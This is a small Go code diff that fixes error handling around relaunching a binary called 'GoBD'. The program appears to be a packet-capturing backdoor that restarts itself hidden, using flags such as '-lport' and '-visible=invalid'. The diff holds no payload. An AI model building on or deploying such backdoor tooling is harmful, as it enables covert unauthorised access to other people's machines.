@@ -39,6 +39,7 @@ import(
 	"log"
 	"github.com/google/gopacket/layers"
 	"golang.org/x/crypto/ssh/terminal"
+	"runtime"
 	"github.com/google/gopacket/pcap"
 	"github.com/google/gopacket"
 	"net"
@@ -82,11 +83,12 @@ func main(){
 		arguments[5] = fmt.Sprintf("-lport=%d", *lPortPtr);
 		arguments[6] = fmt.Sprint("-visible=invalid");
 		if runtime.GOOS == "windows"{
-			_, err := os.StartProcess("GoBD", arguments, &procAttr);
+			_, err := os.StartProcess("GoBD", arguments, &procAttr)
+			checkError(err);
 		} else {
 			_, err := os.StartProcess("./GoBD", arguments, &procAttr);
+			checkError(err);
 		}
-		checkError(err);
 		return;
 	}
 
